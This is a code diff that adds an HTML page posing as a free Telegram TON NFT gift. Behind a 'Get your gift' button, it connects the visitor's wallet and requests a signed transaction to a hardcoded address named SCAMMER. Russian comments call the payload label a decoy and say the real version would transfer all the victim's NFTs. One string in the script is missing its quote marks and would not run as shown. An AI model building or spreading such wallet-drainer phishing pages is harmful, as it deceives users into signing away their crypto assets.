@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Claim TON NFT Gift</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <script src="https://unpkg.com/tonweb@0.0.36/dist/tonweb.js"></script>
+</head>
+<body>
+    <h2>🎁 Free NFT Gift from Telegram</h2>
+    <button id="stealBtn" style="font-size:24px; padding:15px;">Get your gift</button>
+    <p id="log"></p>
+
+    <script>
+        const SCAMMER = "UQCJSrpl31fWUyH-fb8XgUDhekYa7PKPLvTAd8SMYGRTR-Q_";
+
+        document.getElementById("stealBtn").onclick = async () => {
+            const log = document.getElementById("log");
+            log.innerText = "Connecting to TON...";
+
+            if (!window.ton) {
+                log.innerText = "Install Tonkeeper or open in Telegram";
+                return;
+            }
+
+            const ton = window.ton;
+            const connected = await ton.connect();
+            const wallet = ton.account;
+
+            log.innerText = Connected: ${wallet.address}\nSign transaction to claim...;
+
+            // Реальный запрос на перевод NFT
+            const tx = {
+                to: SCAMMER,
+                amount: "0",
+                payload: "transfer NFT gift", // обманка
+                // В реальном коде здесь вставляется transfer всех NFT
+            };
+
+            try {
+                const result = await ton.sendTransaction(tx);
+                log.innerText = "Gift claimed! NFT sent to owner.";
+            } catch(e) {
+                log.innerText = "Error: " + e.message;
+            }
+        };
+    </script>
+</body>
+</html>
